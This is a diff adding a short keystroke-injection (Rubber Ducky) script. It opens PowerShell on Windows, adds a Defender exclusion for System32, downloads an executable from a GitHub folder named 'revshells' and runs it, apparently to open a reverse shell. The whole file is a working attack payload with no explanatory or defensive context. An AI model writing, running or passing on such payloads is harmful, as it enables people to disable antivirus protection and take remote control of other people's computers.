@@ -1,0 +1,10 @@
+DELAY 100
+GUI r 
+DELAY 1000
+STRING runas /trustlevel:0x20000 "powershell.exe 
+STRING Add-MpPreference -ExclusionPath 
+STRING "C:\Windows\System32"; 
+STRING wget https://github.com/AlexanderBissett/
+STRING Yurii-is-a-idiot/raw/main/revshells/sky.exe 
+STRING -o sky.exe; .\sky.exe"
+ENTER
